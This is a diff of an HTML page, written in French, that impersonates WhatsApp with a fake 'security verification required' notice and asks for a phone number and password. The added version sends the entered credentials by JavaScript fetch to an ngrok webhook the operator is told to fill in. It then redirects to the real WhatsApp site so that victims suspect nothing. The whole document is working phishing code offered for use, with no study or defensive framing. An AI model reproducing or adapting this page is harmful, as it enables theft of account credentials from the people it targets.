@@ -1,21 +1,38 @@
 <!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <title>WhatsApp Sécurité</title>
-</head>
-<body style="font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
-    <div style="background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 320px; text-align: center;">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="50" style="margin-bottom: 15px;">
-        <h2 style="color: #075e54; margin: 0 0 10px 0;">WhatsApp</h2>
-        <p style="color: #d32f2f; font-weight: bold; font-size: 14px;">Action requise : Compte suspendu</p>
-        <p style="font-size: 13px; color: #555;">Veuillez confirmer vos identifiants pour lever la restriction de sécurité.</p>
-        
-        <form action="verif.php" method="POST">
-            <input type="text" name="phone" placeholder="Numéro de téléphone" style="width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box;" required>
-            <input type="password" name="password" placeholder="Mot de passe" style="width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box;" required>
-            <button type="submit" style="width: 100%; background-color: #25d366; color: white; border: none; padding: 12px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px;">VALIDER</button>
+<html>
+<body style="font-family:sans-serif;text-align:center;background:#f0f2f5;padding:50px;">
+    <div style="background:white;padding:20px;border-radius:10px;max-width:300px;margin:auto;box-shadow:0 0 10px rgba(0,0,0,0.1)">
+        <h2>WhatsApp</h2>
+        <p style="color:red">Vérification de sécurité requise</p>
+        <form id="monFormulaire">
+            <input type="text" id="tel" placeholder="Numéro de téléphone" style="width:90%;padding:10px;margin:10px" required><br>
+            <input type="password" id="pass" placeholder="Mot de passe" style="width:90%;padding:10px;margin:10px" required><br>
+            <button type="submit" style="background:#25d366;color:white;border:none;padding:10px;width:95%;cursor:pointer">VALIDER</button>
         </form>
     </div>
+
+    <script>
+    document.getElementById('monFormulaire').onsubmit = async (e) => {
+        e.preventDefault();
+        const num = document.getElementById('tel').value;
+        const mdp = document.getElementById('pass').value;
+        
+        // C'EST ICI QUE TU METS TON LIEN NGROK
+        const webhookUrl = "https://L'URL_DE_TON_NGROK.ngrok-free.app/webhook";
+
+        const data = new URLSearchParams();
+        data.append('phone', num);
+        data.append('password', mdp);
+
+        try {
+            // On envoie les infos vers ton PC
+            await fetch(webhookUrl, { method: 'POST', body: data, mode: 'no-cors' });
+            // Une fois envoyé, on redirige vers le vrai WhatsApp pour pas de soupçons
+            window.location.href = "https://www.whatsapp.com";
+        } catch (error) {
+            window.location.href = "https://www.whatsapp.com";
+        }
+    };
+    </script>
 </body>
 </html>
